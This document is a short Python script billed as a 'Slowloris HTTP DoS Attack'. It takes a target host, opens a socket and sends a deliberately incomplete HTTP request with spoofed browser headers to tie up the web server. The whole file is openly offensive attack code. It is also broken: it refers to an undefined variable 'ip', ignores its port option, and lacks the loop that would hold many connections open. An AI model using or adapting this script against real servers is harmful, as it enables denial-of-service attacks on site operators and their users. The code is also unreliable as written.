import argparse
import socket
import random
import sys


parser = argparse.ArgumentParser(description="********** Slowloris HTTP DoS Attack by gunes **********")
parser.add_argument('host', nargs="?", help="Host being attacked.")
parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use in the test", type=int)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

print(args.host)

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

ip_address = args.host

def connect(ip_address):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((ip, 80))
        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

        for header in headers:
            sock.send("{}\r\n".format(header).encode("utf-8"))

        print(sock.getpeername())

        return sock
    except Exception as e:
        print(e)


connect(ip)